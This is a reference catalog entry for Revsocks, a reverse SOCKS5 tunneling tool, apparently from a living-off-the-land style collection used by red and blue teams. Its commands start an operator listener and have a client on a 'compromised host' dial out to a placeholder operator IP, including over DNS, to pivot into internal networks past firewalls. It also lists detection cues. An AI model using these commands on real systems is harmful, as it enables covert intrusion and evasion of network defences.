---
Name: Revsocks
Description: Revsocks is a single-binary reverse SOCKS5 tunneler. A server listens on the operator's host for an inbound connection from a client on the target network, the reverse of a normal SSH dynamic forward, which works from behind NAT/firewalls that only allow outbound connections. It supports TLS, a WebSocket transport that blends in with HTTPS, and a SOCKS5-over-DNS mode.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: revsocks -listen :8443 -socks 127.0.0.1:1080 -pass <PASSWORD>
    Description: Starts the operator-side listener (TLS enabled by default) and exposes a SOCKS5 proxy once the client connects back.
    Usecase: Operator side of a reverse SOCKS5 pivot.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS, BSD

  - Command: revsocks -connect <OPERATOR_IP>:8443 -pass <PASSWORD>
    Description: Client run on the compromised host, dialing out to the operator's listener to establish the reverse SOCKS5 tunnel.
    Usecase: Pivoting into the internal network from a host that can only make outbound connections.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS, BSD

  - Command: revsocks -dns <TUNNEL_DOMAIN> -pass <PASSWORD>
    Description: Client variant that carries the reverse SOCKS5 tunnel inside DNS queries to the given domain, for networks where only DNS resolution is permitted outbound.
    Usecase: Pivoting over DNS when direct outbound connections are blocked.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS, BSD
Full_Path:
  - Filename: revsocks
  - Filename: revsocks.exe
  - Path: Downloaded/compiled revsocks binary, executed anywhere on the system.
Detection:
  - Command: Execution of revsocks with -listen/-connect/-dns and -pass arguments, or the REVSOCKS_* environment variables that mirror those options.
  - Command: Outbound TLS or WebSocket connections to an uncategorized host carrying SOCKS5 framing, or DNS query volume consistent with tunneling when -dns is used.
Resources:
  - Link: https://github.com/kost/revsocks
---
